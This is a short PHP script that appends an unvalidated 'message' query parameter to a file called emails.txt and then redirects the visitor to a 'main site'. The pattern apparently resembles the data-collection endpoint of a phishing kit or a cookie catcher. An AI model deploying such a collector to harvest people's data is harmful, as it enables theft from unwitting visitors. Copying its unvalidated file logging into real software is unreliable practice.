<?php
  $log_file_name = 'emails.txt'; // Change to the log file name
  $message = $_GET['message'] . PHP_EOL; // incoming message
  file_put_contents($log_file_name, $message, FILE_APPEND);
  header('Location: /1'); // redirect back to the main site
?>